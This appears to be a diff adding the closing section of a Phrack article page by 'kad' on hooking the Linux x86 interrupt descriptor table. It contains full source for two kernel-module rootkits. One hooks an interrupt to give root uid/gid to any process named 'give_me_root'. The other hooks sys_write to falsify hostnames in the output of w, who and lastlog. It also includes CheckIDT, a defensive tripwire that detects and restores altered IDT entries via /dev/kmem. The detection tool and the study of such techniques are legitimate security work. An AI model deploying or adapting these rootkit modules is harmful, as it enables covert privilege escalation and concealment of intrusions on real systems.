+#define __KERNEL__
+#include &lt;linux/module.h&gt;
+#include &lt;linux/tty.h&gt;
+#include &lt;linux/sched.h&gt;
+#include &lt;linux/init.h&gt;
+#ifndef KERNEL2
+#include &lt;linux/slab.h&gt;
+#else
+#include &lt;linux/malloc.h&gt;
+#endif
+
+/*------------------------------------------*/
+asmlinkage void my_function(unsigned long);
+/*------------------------------------------*/
+MODULE_AUTHOR(&quot;Kad&quot;);
+MODULE_DESCRIPTION(&quot;Hooking of int3 , give root right to process&quot;);
+MODULE_PARM(interrupt,&quot;i&quot;);
+MODULE_PARM_DESC(interrupt,&quot;Interrupt number&quot;);
+/*------------------------------------------*/
+unsigned long ptr_idt_table;
+unsigned long old_stub;
+extern asmlinkage void my_stub();
+unsigned long hostile_code=(unsigned long)&amp;my_function;
+int interrupt;
+/*------------------------------------------*/
+
+struct descriptor_idt
+        {
+        unsigned short offset_low,seg_selector;
+        unsigned char reserved,flag;
+        unsigned short offset_high;
+        };
+
+void stub_kad(void)
+        {
+__asm__ (
+        &quot;.globl my_stub                 \n&quot;
+        &quot;.align 4,0x90                  \n&quot;
+        &quot;my_stub:                       \n&quot;
+        &quot;       pushl %%ebx             \n&quot;
+        &quot;       movl %%esp,%%ebx        \n&quot;
+        &quot;       andl $-8192,%%ebx       \n&quot;
+        &quot;       pushl %%ebx             \n&quot;
+        &quot;       call *%0                \n&quot;
+        &quot;       addl $4,%%esp           \n&quot;
+        &quot;       popl %%ebx              \n&quot;
+        &quot;       jmp  *%1                \n&quot;
+        ::&quot;m&quot;(hostile_code),&quot;m&quot;(old_stub)
+        );
+        }
+
+
+asmlinkage void my_function(unsigned long addr_task)
+        {
+        struct task_struct *p = &amp;((struct task_struct *) addr_task)[0]; 
+	if(strcmp(p-&gt;comm,&quot;give_me_root&quot;)==0 )
+                {
+   		#ifdef DEBUG             
+			printk(&quot;UID : %i GID : %i SUID : %i\n&quot;,p-&gt;uid,
+			p-&gt;gid,p-&gt;suid);
+		#endif
+                p-&gt;uid=0;
+                p-&gt;gid=0;
+  		#ifdef DEBUG 		
+			printk(&quot;UID : %i GID  %i SUID : %i\n&quot;,p-&gt;uid,p-&gt;gid,p-&gt;suid);
+		#endif 	
+                }
+        else
+                {
+                #ifdef DEBUG
+                        printk(&quot;&lt;1&gt;Interrupt %i hijack \n&quot;,interrupt);
+                #endif
+                }
+        }
+
+unsigned long get_addr_idt (void)
+        {
+         unsigned char idtr[6];
+         unsigned long idt;
+        __asm__ volatile (&quot;sidt %0&quot;: &quot;=m&quot; (idtr));
+        idt = *((unsigned long *) &amp;idtr[2]);
+        return(idt);
+        }
+
+unsigned short get_size_idt(void)
+        {
+        unsigned idtr[6];
+        unsigned short size;
+        __asm__ volatile (&quot;sidt %0&quot;: &quot;=m&quot; (idtr));
+        size=*((unsigned short *) &amp;idtr[0]);
+        return(size);
+        }
+
+void * get_stub_from_idt (int n)
+        {
+        struct descriptor_idt *idte = &amp;((struct descriptor_idt *) ptr_idt_table) [n];
+        return ((void *) ((idte-&gt;offset_high &lt;&lt; 16 ) + idte-&gt;offset_low));
+        }
+
+void hook_stub(int n,void *new_stub,unsigned long *old_stub)
+        {
+         unsigned long new_addr=(unsigned long)new_stub;
+         struct descriptor_idt *idt=(struct descriptor_idt *)ptr_idt_table;
+         //save old stub
+         if(old_stub)
+                *old_stub=(unsigned long)get_stub_from_idt(n);
+         #ifdef DEBUG
+                printk(&quot;Hook : new stub addresse not splited : 0x%.8x\n&quot;,new_addr);
+         #endif
+         //assign new stub
+         idt[n].offset_high = (unsigned short) (new_addr &gt;&gt; 16);
+         idt[n].offset_low  = (unsigned short) (new_addr &amp; 0x0000FFFF);
+         #ifdef DEBUG
+                printk(&quot;Hook : idt-&gt;offset_high : 0x%.8x\n&quot;,idt[n].offset_high);
+                printk(&quot;Hook : idt-&gt;offset_low : 0x%.8x\n&quot;,idt[n].offset_low);
+         #endif
+         return;
+        }
+
+int write_console (char *str)
+        {
+         struct tty_struct *my_tty;
+         if((my_tty=current-&gt;tty) != NULL)
+                {
+                (*(my_tty-&gt;driver).write) (my_tty,0,str,strlen(str));
+                return 0;
+                }
+         else return -1;
+        }
+
+static int __init kad_init(void)
+        {
+        int x;
+ 	EXPORT_NO_SYMBOLS;       
+	ptr_idt_table=get_addr_idt();
+        write_console(&quot;Inserting hook \r\n&quot;);
+        hook_stub(interrupt,&amp;my_stub,&amp;old_stub);
+	#ifdef DEBUG
+                printk(&quot;Set hooking on interrupt %i\n&quot;,interrupt);
+        #endif
+        write_console(&quot;Hooking finished \r\n&quot;);
+        return 0;
+        }
+
+static void kad_exit(void)
+        {
+        write_console(&quot;Removing hook\r\n&quot;);
+        hook_stub(interrupt,(char *)old_stub,NULL);
+        }
+
+module_init(kad_init);
+module_exit(kad_exit);
+
+
+******************************************************************************
+
+CODE 3:
+-------
+
+/**************************************************************/
+/* Hooking of sys_write for w,who and lastlog. 
+/* You can add an another program when you insmod the module
+/* By kad
+/**************************************************************/
+
+#define MODULE
+#define __KERNEL__
+
+#include &lt;linux/module.h&gt;
+#include &lt;linux/tty.h&gt;
+#include &lt;linux/sched.h&gt;
+#include &lt;linux/init.h&gt;
+#ifndef KERNEL2
+#include &lt;linux/slab.h&gt;
+#else
+#include &lt;linux/malloc.h&gt;
+#endif
+#include &lt;linux/interrupt.h&gt;
+#include &lt;linux/compatmac.h&gt;
+
+#define sys_number 4
+#define HIDE_STRING &quot;localhost&quot;
+#define FALSE_STRING &quot;somewhere&quot;
+#define PROG &quot;w&quot;
+
+/*------------------------------------------*/
+asmlinkage char * my_function(struct pt_regs * regs,unsigned long fd_task);
+/*------------------------------------------*/
+MODULE_AUTHOR(&quot;kad&quot;);
+MODULE_DESCRIPTION(&quot;Hooking of sys_write&quot;);
+MODULE_PARM(interrupt,&quot;i&quot;);
+MODULE_PARM_DESC(interrupt,&quot;Interrupt number&quot;);
+MODULE_PARM(hide_string,&quot;s&quot;);
+MODULE_PARM_DESC(hide_string,&quot;String to hide&quot;);
+MODULE_PARM(false_string,&quot;s&quot;);
+MODULE_PARM_DESC(false_string,&quot;The fake string&quot;);
+MODULE_PARM(progy,&quot;s&quot;);
+MODULE_PARM_DESC(progy,&quot;You can add another program to fake&quot;);
+/*------------------------------------------*/
+unsigned long ptr_idt_table;
+unsigned long old_stub;
+extern asmlinkage void my_stub();
+unsigned long hostile_code=(unsigned long)&amp;my_function;
+int interrupt;
+char *hide_string;
+char *false_string;
+char *progy;
+/*------------------------------------------*/
+
+struct descriptor_idt
+        {
+        unsigned short offset_low,seg_selector;
+        unsigned char reserved,flag;
+        unsigned short offset_high;
+        };
+
+void stub_kad(void)
+        {
+__asm__ (
+        &quot;.globl my_stub                 \n&quot;
+        &quot;.align 4,0x90                  \n&quot;
+        &quot;my_stub:                       \n&quot;
+                //save the register value
+                &quot;       pushl %%ds                      \n&quot;
+                &quot;       pushl %%eax                     \n&quot;
+                &quot;       pushl %%ebp                     \n&quot;
+                &quot;       pushl %%edi                     \n&quot;
+                &quot;       pushl %%esi                     \n&quot;
+                &quot;       pushl %%edx                     \n&quot;
+                &quot;       pushl %%ecx                     \n&quot;
+                &quot;       pushl %%ebx                     \n&quot;
+                //compare it's the good syscall
+                &quot;       xor %%ebx,%%ebx                 \n&quot;
+                &quot;       movl %2,%%ebx	                \n&quot;
+                &quot;       cmpl %%eax,%%ebx                \n&quot;
+                &quot;       jne finis                       \n&quot;
+                //if it's the good syscall , continue :)
+                &quot;       mov %%esp,%%edx                 \n&quot;
+                &quot;       mov %%esp,%%eax                 \n&quot;
+                &quot;       andl $-8192,%%eax               \n&quot;
+                &quot;       pushl %%eax                     \n&quot;
+                &quot;       push %%edx          		\n&quot;
+                &quot;       call *%0                        \n&quot;
+                &quot;       addl $8,%%esp                   \n&quot;
+                &quot;finis:                                 \n&quot;
+                //restore register
+                &quot;       popl %%ebx    		        \n&quot;
+                &quot;       popl %%ecx        		\n&quot;
+                &quot;       popl %%edx          		\n&quot;
+                &quot;       popl %%esi           		\n&quot;
+                &quot;       popl %%edi             	  	\n&quot;
+                &quot;       popl %%ebp              	\n&quot;
+                &quot;       popl %%eax              	\n&quot;
+                &quot;       popl %%ds               	\n&quot;
+                &quot;       jmp  *%1                	\n&quot;
+        ::&quot;m&quot;(hostile_code),&quot;m&quot;(old_stub),&quot;i&quot;(sys_number)
+        );
+        }
+
+asmlinkage char * my_function(struct pt_regs * regs,unsigned long fd_task)
+        {
+        struct task_struct *my_task = &amp;((struct task_struct * ) fd_task) [0];
+        char *ptr=(char *) regs-&gt;ecx;
+        char * buffer,*ptr3;
+
+        if(strcmp(my_task-&gt;comm,&quot;w&quot;)==0 || strcmp(my_task-&gt;comm,&quot;who&quot;)==0 
+	|| strcmp(my_task-&gt;comm,&quot;lastlog&quot;)==0 							
+	|| ((progy != 0)?(strcmp(my_task-&gt;comm,progy)==0):0) )
+               {
+                buffer=(char * ) kmalloc(regs-&gt;edx,GFP_KERNEL);
+                copy_from_user(buffer,ptr,regs-&gt;edx);
+                if(hide_string)
+                        {
+                         ptr3=strstr(buffer,hide_string);
+                        }
+                else
+                        {
+                         ptr3=strstr(buffer,HIDE_STRING);
+                        }
+                if(ptr3 != NULL )
+                        {
+                        if (false_string)
+                                {
+                                strncpy(ptr3,false_string,strlen(false_string));
+                                }
+                        else
+                                {
+                                strncpy(ptr3,FALSE_STRING,strlen(FALSE_STRING));
+                                }
+                        copy_to_user(ptr,buffer,regs-&gt;edx);
+                        }
+                kfree(buffer);
+               }
+        }
+
+unsigned long get_addr_idt (void)
+        {
+         unsigned char idtr[6];
+         unsigned long idt;
+        __asm__ volatile (&quot;sidt %0&quot;: &quot;=m&quot; (idtr));
+        idt = *((unsigned long *) &amp;idtr[2]);
+        return(idt);
+        }
+
+void * get_stub_from_idt (int n)
+        {
+        struct descriptor_idt *idte = &amp;((struct descriptor_idt *) ptr_idt_table) [n];
+        return ((void *) ((idte-&gt;offset_high &lt;&lt; 16 ) + idte-&gt;offset_low));
+        }
+
+void hook_stub(int n,void *new_stub,unsigned long *old_stub)
+        {
+         unsigned long new_addr=(unsigned long)new_stub;
+         struct descriptor_idt *idt=(struct descriptor_idt *)ptr_idt_table;
+         //save old stub
+         if(old_stub)
+                *old_stub=(unsigned long)get_stub_from_idt(n);
+         #ifdef DEBUG
+                printk(&quot;Hook : new stub addresse not splited : 0x%.8x\n&quot;,
+		new_addr);
+         #endif
+         //assign new stub
+         idt[n].offset_high = (unsigned short) (new_addr &gt;&gt; 16);
+         idt[n].offset_low  = (unsigned short) (new_addr &amp; 0x0000FFFF);
+         #ifdef DEBUG
+                printk(&quot;Hook : idt-&gt;offset_high : 0x%.8x\n&quot;,idt[n].offset_high);
+                printk(&quot;Hook : idt-&gt;offset_low : 0x%.8x\n&quot;,idt[n].offset_low);
+         #endif
+         return;
+        }
+
+int write_console (char *str)
+        {
+         struct tty_struct *my_tty;
+         if((my_tty=current-&gt;tty) != NULL)
+                {
+                (*(my_tty-&gt;driver).write) (my_tty,0,str,strlen(str));
+                return 0;
+                }
+         else return -1;
+        }
+
+static int __init kad_init(void)
+        {
+        EXPORT_NO_SYMBOLS;
+        ptr_idt_table=get_addr_idt();
+        write_console(&quot;Inserting hook \r\n&quot;);
+        hook_stub(interrupt,&amp;my_stub,&amp;old_stub);
+        #ifdef DEBUG
+                printk(&quot;Set hooking on interrupt %i\n&quot;,interrupt);
+        #endif
+        write_console(&quot;Hooking finish \r\n&quot;);
+        return 0;
+        }
+
+static void kad_exit(void)
+        {
+        write_console(&quot;Removing hook\r\n&quot;);
+        hook_stub(interrupt,(char *)old_stub,NULL);
+        }
+
+module_init(kad_init);
+module_exit(kad_exit);
+
+
+******************************************************************************
+
+&lt;++&gt; checkidt/Makefile
+all: checkidt.c
+	gcc -Wall -o checkidt checkidt.c
+&lt;--&gt;
+
+&lt;++&gt; checkidt/checkidt.c
+/*
+ * CheckIDT V1.1
+ * Play with IDT from userland
+ * It's a tripwire kind for IDT
+ * kad 2002
+ * 
+ * gcc -Wall -o checkidt checkidt.c
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;asm/segment.h&gt;
+#include &lt;string.h&gt;
+
+#define NORMAL          &quot;\033[0m&quot;
+#define NOIR            &quot;\033[30m&quot;
+#define ROUGE           &quot;\033[31m&quot;
+#define VERT            &quot;\033[32m&quot;
+#define JAUNE           &quot;\033[33m&quot;
+#define BLEU            &quot;\033[34m&quot;
+#define MAUVE           &quot;\033[35m&quot;
+#define BLEU_CLAIR      &quot;\033[36m&quot;
+#define SYSTEM          &quot;System gate&quot;
+#define INTERRUPT       &quot;Interrupt gate&quot;
+#define TRAP            &quot;Trap gate&quot;
+#define DEFAULT_FILE    &quot;Safe_idt&quot;
+#define DEFAULT_MAP		&quot;/boot/System.map&quot;
+
+/***********GLOBAL**************/
+int fd_kmem;
+unsigned long ptr_idt;
+/******************************/
+
+
+struct descriptor_idt
+        {
+        unsigned short offset_low,seg_selector;
+        unsigned char reserved,flag;
+        unsigned short offset_high;
+        };
+
+struct Mode
+        {
+         int show_idt_addr;
+         int show_all_info;
+         int read_file_archive;
+         int create_file_archive;
+         char out_filename[20];
+         int compare_idt;
+         int restore_idt;
+         char in_filename[20];
+         int show_all_descriptor;
+	 int resolve;
+	 char map_filename[40];   
+      };
+
+unsigned long get_addr_idt (void)
+        {
+         unsigned char idtr[6];
+         unsigned long idt;
+        __asm__ volatile (&quot;sidt %0&quot;: &quot;=m&quot; (idtr));
+        idt = *((unsigned long *) &amp;idtr[2]);
+        return(idt);
+        }
+
+unsigned short get_size_idt(void)
+        {
+        unsigned idtr[6];
+        unsigned short size;
+        __asm__ volatile (&quot;sidt %0&quot;: &quot;=m&quot; (idtr));
+        size=*((unsigned short *) &amp;idtr[0]);
+        return(size);
+        }
+
+char * get_segment(unsigned short selecteur)
+        {
+         if(selecteur == __KERNEL_CS)
+                {
+                 return(&quot;KERNEL_CS&quot;);
+                }
+         if(selecteur == __KERNEL_DS)
+                {
+                 return(&quot;KERNEL_DS&quot;);
+                }
+         if(selecteur == __USER_CS)
+                {
+                 return(&quot;USER_CS&quot;);
+                }
+         if(selecteur == __USER_DS)
+                {
+                 return(&quot;USER_DS&quot;);
+                }
+         else
+                {
+                 printf(&quot;UNKNOW\n&quot;);
+                }
+        }
+
+
+void readkmem(void *m,unsigned off,int size)
+        {
+        if(lseek(fd_kmem,off,SEEK_SET) != off)
+                {
+                fprintf(stderr,&quot;Error lseek. Are you root? \n&quot;);
+                exit(-1);
+                }
+        if(read(fd_kmem,m,size)!= size)
+                {
+                fprintf(stderr,&quot;Error read kmem\n&quot;);
+                exit(-1);
+                }
+        }
+
+void writekmem(void *m,unsigned off,int size)
+        {
+        if(lseek(fd_kmem,off,SEEK_SET) != off)
+                {
+                fprintf(stderr,&quot;Error lseek. Are you root? \n&quot;);
+                exit(-1);
+                }
+        if(write(fd_kmem,m,size)!= size)
+                {
+                fprintf(stderr,&quot;Error read kmem\n&quot;);
+                exit(-1);
+                }
+        }
+
+void resolv(char *file,unsigned long stub_addr,char *name)
+	{
+	FILE *fd;
+	char buf[100],addr[30];
+	int ptr,ptr_begin,ptr_end;
+	snprintf(addr,30,&quot;%x&quot;,(char *)stub_addr);
+	if(!(fd=fopen(file,&quot;r&quot;)))
+		{
+		fprintf(stderr,&quot;Can't open map file. You can specify a map file -S option or change #define in source\n&quot;);
+		exit(-1);
+		}
+ 	while(fgets(buf,100,fd) != NULL)
+		{	
+		ptr=strstr(buf,addr);
+		if(ptr)
+			{
+			bzero(name,30);
+			ptr_begin=strstr(buf,&quot; &quot;);
+			ptr_begin=strstr(ptr_begin+1,&quot; &quot;);
+			ptr_end=strstr(ptr_begin+1,&quot;\n&quot;);
+			strncpy(name,ptr_begin+1,ptr_end-ptr_begin-1);
+			break;
+			}
+	 	}
+	if(strlen(name)==0)strcpy(name,ROUGE&quot;can't resolve&quot;NORMAL); 
+	fclose(fd);
+	}
+
+void show_all_info(int interrupt,int all_descriptor,char *file,int resolve)
+        {
+        struct descriptor_idt *descriptor;
+        unsigned long stub_addr;
+        unsigned short selecteur;
+        char type[15];
+        char segment[15];
+	char name[30];
+        int x;
+        int dpl;
+	bzero(name,strlen(name));
+        descriptor=(struct descriptor_idt *)malloc(sizeof(struct descriptor_idt));
+        printf(&quot;Int *** Stub Address *** Segment *** DPL *** Type &quot;);
+	if(resolve &gt;= 0) 
+		{
+		printf(&quot;            Handler Name\n&quot;);
+		printf(&quot;--------------------------------------------------------------------------\n&quot;);
+		}
+	else
+		{
+		printf(&quot;\n&quot;);
+        	printf(&quot;---------------------------------------------------\n&quot;);
+		}
+	
+        if(interrupt &gt;= 0)
+                {
+                readkmem(descriptor,ptr_idt+8*interrupt,sizeof(struct descriptor_idt));
+                stub_addr=(unsigned long)(descriptor-&gt;offset_high &lt;&lt; 16) + descriptor-&gt;offset_low;
+                selecteur=(unsigned short) descriptor-&gt;seg_selector;
+                if(descriptor-&gt;flag &amp; 64) dpl=3;
+                else dpl = 0;
+                if(descriptor-&gt;flag &amp; 1)
+                        {
+                        if(dpl)
+                                strncpy(type,SYSTEM,sizeof(SYSTEM));
+                        else strncpy(type,TRAP,sizeof(TRAP));
+                        }
+                else strncpy(type,INTERRUPT,sizeof(INTERRUPT));
+                strcpy(segment,get_segment(selecteur));
+                
+		if(resolve &gt;= 0) 
+			{
+			resolv(file,stub_addr,name); 
+			printf(&quot;%-7i 0x%-14.8x %-12s%-8i%-16s %s\n&quot;,interrupt,stub_addr,segment,dpl,type,name);
+			}
+		else 
+			{
+			printf(&quot;%-7i 0x%-14.8x %-12s %-7i%s\n&quot;,interrupt,stub_addr,segment,dpl,type);
+			}   
+             }
+        if(all_descriptor &gt;= 0 )
+                {
+                for (x=0;x&lt;(get_size_idt()+1)/8;x++)
+                        {
+                        readkmem(descriptor,ptr_idt+8*x,sizeof(struct descriptor_idt));
+                        stub_addr=(unsigned long)(descriptor-&gt;offset_high &lt;&lt; 16) + descriptor-&gt;offset_low;
+                        if(stub_addr != 0)
+                                {
+                                selecteur=(unsigned short) descriptor-&gt;seg_selector;
+                                if(descriptor-&gt;flag &amp; 64) dpl=3;
+                                else dpl = 0;
+                                if(descriptor-&gt;flag &amp; 1)
+                                        {
+                                        if(dpl)
+                                                strncpy(type,SYSTEM,sizeof(SYSTEM));
+                                        else strncpy(type,TRAP,sizeof(TRAP));
+                                        }
+                                else strncpy(type,INTERRUPT,sizeof(INTERRUPT));
+                                strcpy(segment,get_segment(selecteur));
+						if(resolve &gt;= 0) 
+							{
+							bzero(name,strlen(name));
+							resolv(file,stub_addr,name);
+							printf(&quot;%-7i 0x%-14.8x %-12s%-8i%-16s %s\n&quot;,x,stub_addr,segment,dpl,type,name);
+							}
+						else
+							{ 
+	                            printf(&quot;%-7i 0x%-14.8x %-12s %-7i%s\n&quot;,x,stub_addr,segment,dpl,type);
+							}
+                                }
+                        }
+                }
+        free(descriptor);
+        }
+
+void create_archive(char *file)
+        {
+         FILE *file_idt;
+         struct descriptor_idt *descriptor;
+         int x;
+         descriptor=(struct descriptor_idt *)malloc(sizeof(struct descriptor_idt));
+         if(!(file_idt=fopen(file,&quot;w&quot;)))
+                {
+                fprintf(stderr,&quot;Error while opening file\n&quot;);
+                exit(-1);
+                }
+         for(x=0;x&lt;(get_size_idt()+1)/8;x++)
+                {
+                readkmem(descriptor,ptr_idt+8*x,sizeof(struct descriptor_idt));
+                fwrite(descriptor,sizeof(struct descriptor_idt),1,file_idt);
+                }
+         free(descriptor);
+         fclose(file_idt);
+         fprintf(stderr,&quot;Creating file archive idt done \n&quot;);
+        }
+
+void read_archive(char *file)
+        {
+         FILE *file_idt;
+         int x;
+         struct descriptor_idt *descriptor;
+         unsigned long stub_addr;
+         descriptor=(struct descriptor_idt *)malloc(sizeof(struct descriptor_idt));
+         if(!(file_idt=fopen(file,&quot;r&quot;)))
+                {
+                fprintf(stderr,&quot;Error, check if the file exist\n&quot;);
+                exit(-1);
+                }
+         for(x=0;x&lt;(get_size_idt()+1)/8;x++)
+                {
+                fread(descriptor,sizeof(struct descriptor_idt),1,file_idt);
+                stub_addr=(unsigned long)(descriptor-&gt;offset_high &lt;&lt; 16) + descriptor-&gt;offset_low;
+                printf(&quot;Interruption : %i  -- Stub addresse : 0x%.8x\n&quot;,x,stub_addr);
+                }
+         free(descriptor);
+         fclose(file_idt);
+        }
+
+void compare_idt(char *file,int restore_idt)
+        {
+        FILE *file_idt;
+        int x,change=0;
+        int result;
+        struct descriptor_idt *save_descriptor,*actual_descriptor;
+        unsigned long save_stub_addr,actual_stub_addr;
+        unsigned short *offset;
+        save_descriptor=(struct descriptor_idt *)malloc(sizeof(struct descriptor_idt));
+        actual_descriptor=(struct descriptor_idt *)malloc(sizeof(struct descriptor_idt));
+        file_idt=fopen(file,&quot;r&quot;);
+        for(x=0;x&lt;(get_size_idt()+1)/8;x++)
+                {
+                fread(save_descriptor,sizeof(struct descriptor_idt),1,file_idt);
+                save_stub_addr=(unsigned long)(save_descriptor-&gt;offset_high &lt;&lt; 16) + save_descriptor-&gt;offset_low;
+                readkmem(actual_descriptor,ptr_idt+8*x,sizeof(struct descriptor_idt));
+                actual_stub_addr=(unsigned long)(actual_descriptor-&gt;offset_high &lt;&lt; 16) + actual_descriptor-&gt;offset_low;
+                if(actual_stub_addr != save_stub_addr)
+                        {
+                         if(restore_idt &lt; 1)
+                                {
+                                fprintf(stderr,VERT&quot;Hey stub address of interrupt %i has changed!!!\n&quot;NORMAL,x);
+                                fprintf(stderr,&quot;Old Value : 0x%.8x\n&quot;,save_stub_addr);
+                                fprintf(stderr,&quot;New Value : 0x%.8x\n&quot;,actual_stub_addr);
+                                change=1;
+                                }
+                         else
+                                {
+                                fprintf(stderr,VERT&quot;Restore old stub address of interrupt %i\n&quot;NORMAL,x);
+                                actual_descriptor-&gt;offset_high = (unsigned short) (save_stub_addr &gt;&gt; 16);
+                                actual_descriptor-&gt;offset_low  = (unsigned short) (save_stub_addr &amp; 0x0000FFFF);
+                                writekmem(actual_descriptor,ptr_idt+8*x,sizeof(struct descriptor_idt));
+                                change=1;
+                                }
+                        }
+                }
+        if(!change)
+                fprintf(stderr,VERT&quot;All values are same\n&quot;NORMAL);
+        }
+
+void initialize_value(struct Mode *mode)
+        {
+        mode-&gt;show_idt_addr=-1;
+        mode-&gt;show_all_info=-1;
+        mode-&gt;show_all_descriptor=-1;
+        mode-&gt;create_file_archive=-1;
+        mode-&gt;read_file_archive=-1;
+        strncpy(mode-&gt;out_filename,DEFAULT_FILE,strlen(DEFAULT_FILE));
+        mode-&gt;compare_idt=-1;
+        mode-&gt;restore_idt=-1;
+        strncpy(mode-&gt;in_filename,DEFAULT_FILE,strlen(DEFAULT_FILE));
+	strncpy(mode-&gt;map_filename,DEFAULT_MAP,strlen(DEFAULT_MAP));
+	mode-&gt;resolve=-1;
+        }
+
+void usage()
+        {
+        fprintf(stderr,&quot;CheckIDT V 1.1 by kad\n&quot;);
+        fprintf(stderr,&quot;---------------------\n&quot;);
+        fprintf(stderr,&quot;Option : \n&quot;);
+        fprintf(stderr,&quot;       -a nb    show all info about one interrupt\n&quot;);
+        fprintf(stderr,&quot;       -A       showw all info about all interrupt\n&quot;);
+        fprintf(stderr,&quot;       -I       show IDT address \n&quot;);
+        fprintf(stderr,&quot;       -c       create file archive\n&quot;);
+        fprintf(stderr,&quot;       -r       read file archive\n&quot;);
+        fprintf(stderr,&quot;       -o file  output filename (for creating file archive)\n&quot;);
+        fprintf(stderr,&quot;       -C       compare save idt &amp; new idt\n&quot;);
+        fprintf(stderr,&quot;       -R       restore IDT\n&quot;);
+        fprintf(stderr,&quot;       -i file  input filename to compare or read\n&quot;);
+	fprintf(stderr,&quot;       -s 		resolve symbol thanks to /boot/System.map\n&quot;);
+	fprintf(stderr,&quot;       -S file	specify a map file\n\n&quot;); 
+        exit(1);
+        }
+
+int main(int argc, char ** argv)
+        {
+        int option;
+        struct Mode *mode;
+        if (argc &lt; 2)
+                {
+		 usage();
+                }
+
+        mode=(struct Mode *) malloc(sizeof(struct Mode));
+        initialize_value(mode);
+
+        while((option=getopt(argc,argv,&quot;hIa:Aco:Ci:rRsS:&quot;))!=-1)
+                {
+                switch(option)
+                        {
+                        case 'h': usage();
+                                  exit(1);
+                        case 'I': mode-&gt;show_idt_addr=1;
+                                  break;
+                        case 'a': mode-&gt;show_all_info=atoi(optarg);
+                                  break;
+                        case 'A': mode-&gt;show_all_descriptor=1;
+                                  break;
+                        case 'c': mode-&gt;create_file_archive=1;
+                                  break;
+                        case 'r': mode-&gt;read_file_archive=1;
+                                  break;
+                        case 'R': mode-&gt;restore_idt=1;
+                                  break;
+                        case 'o': bzero(mode-&gt;out_filename,sizeof(mode-&gt;out_filename));
+                                  if(strlen(optarg) &gt; 20)
+                                        {
+                                         fprintf(stderr,&quot;Filename too long\n&quot;);
+                                         exit(-1);
+                                        }
+                                  strncpy(mode-&gt;out_filename,optarg,strlen(optarg));
+                                  break;
+                        case 'C': mode-&gt;compare_idt=1;
+                                  break;
+                        case 'i': bzero(mode-&gt;in_filename,sizeof(mode-&gt;in_filename));
+                                  if(strlen(optarg) &gt; 20)
+                                        {
+                                        fprintf(stderr,&quot;Filename too long\n&quot;);
+                                        exit(-1);
+                                        }
+                                  strncpy(mode-&gt;in_filename,optarg,strlen(optarg));
+                                  break;
+				case 's': mode-&gt;resolve=1;
+					      break;
+				case 'S': bzero(mode-&gt;map_filename,sizeof(mode-&gt;map_filename));
+						  if(strlen(optarg) &gt; 40)
+								{
+								fprintf(stderr,&quot;Filename too long\n&quot;);
+								exit(-1);
+								}
+						  if(optarg)strncpy(mode-&gt;map_filename,optarg,strlen(optarg));
+						  break;
+                        }
+                }
+	printf(&quot;\n&quot;);
+        ptr_idt=get_addr_idt();
+        if(mode-&gt;show_idt_addr &gt;= 0)
+                {
+                 fprintf(stdout,&quot;Addresse IDT : 0x%x\n&quot;,ptr_idt);
+                }
+        fd_kmem=open(&quot;/dev/kmem&quot;,O_RDWR);
+        if(mode-&gt;show_all_info &gt;= 0 || mode-&gt;show_all_descriptor &gt;= 0)
+                {
+                show_all_info(mode-&gt;show_all_info,mode-&gt;show_all_descriptor,mode-&gt;map_filename,mode-&gt;resolve);
+                }
+        if(mode-&gt;create_file_archive &gt;= 0)
+                {
+                create_archive(mode-&gt;out_filename);
+                }
+        if(mode-&gt;read_file_archive &gt;= 0)
+                {
+                read_archive(mode-&gt;in_filename);
+                }
+        if(mode-&gt;compare_idt &gt;= 0)
+                {
+                compare_idt(mode-&gt;in_filename,mode-&gt;restore_idt);
+                }
+        if(mode-&gt;restore_idt &gt;= 0)
+                {
+                compare_idt(mode-&gt;in_filename,mode-&gt;restore_idt);
+                }
+        printf(JAUNE&quot;\nThanks for choosing kad's products :-)\n&quot;NORMAL);
+
+        free(mode);
+        return 0;
+        }
+
+&lt;--&gt;
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
